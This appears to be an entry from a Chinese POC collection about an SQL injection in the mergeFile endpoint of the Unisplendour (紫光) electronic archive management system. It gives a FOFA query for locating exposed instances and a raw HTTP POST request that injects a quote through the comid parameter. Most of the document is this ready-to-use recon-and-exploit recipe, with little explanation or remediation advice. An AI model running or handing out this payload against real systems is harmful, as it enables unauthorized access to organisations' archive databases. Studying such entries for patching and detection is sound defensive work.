# 紫光档案管理系统mergeFile存在SQL注入漏洞
紫光电子档案管理系统是一款专业的电子档案管理软件，旨在帮助企业实现高效、便捷的档案管理。系统具有强大的文件存储、检索和共享功能，能够提供全面的档案管理解决方案。同时，紫光电子档案管理系统还拥有智能化的分类和归档功能，可以自动识别文件类型和属性，实现快速分类和高效管理。用户只需简单操作，就能轻松实现对各类电子档案的整理、查询和备份，极大提升了工作效率和信息安全性。紫光档案管理系统mergeFile存在SQL注入漏洞

## fofa
```javascript
app="紫光-档案管理系统" && body="www.unissoft.com"
```

## poc
```java
POST /Archive/ErecordManage/mergeFile HTTP/1.1
Host: 
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: max-age=0
Connection: close
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36

userID=admin&fondsid=1&comid=1'
```

![](https://cdn.nlark.com/yuque/0/2024/png/29512878/1731327037075-c9e88b13-b658-4e7e-b7ad-a6c7d12dca30.png)

